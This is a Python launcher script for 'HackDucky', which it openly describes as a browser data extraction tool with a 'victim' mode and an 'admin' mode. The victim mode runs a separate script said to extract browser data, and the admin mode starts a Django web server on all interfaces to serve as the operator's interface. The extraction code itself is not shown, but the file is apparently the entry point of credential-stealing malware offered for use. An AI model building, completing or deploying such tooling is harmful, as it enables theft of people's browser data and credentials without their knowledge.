#!/usr/bin/env python3
"""
HackDucky - Browser Data Extraction Tool
Main entry point for both victim and admin components
"""

import sys
import os
import argparse
import subprocess

def run_victim():
    """Run the victim script to extract browser data"""
    print("Starting victim script...")
    os.chdir('v')
    subprocess.run([sys.executable, 'main.py'])

def run_admin():
    """Run the Django admin server"""
    print("Starting admin server...")
    os.chdir('admin')
    subprocess.run([sys.executable, 'manage.py', 'runserver', '0.0.0.0:8000'])

def main():
    parser = argparse.ArgumentParser(description='HackDucky - Browser Data Extraction Tool')
    parser.add_argument('mode', choices=['victim', 'admin'], 
                       help='Mode to run: victim (extract data) or admin (web interface)')
    
    args = parser.parse_args()
    
    if args.mode == 'victim':
        run_victim()
    elif args.mode == 'admin':
        run_admin()

if __name__ == "__main__":
    main()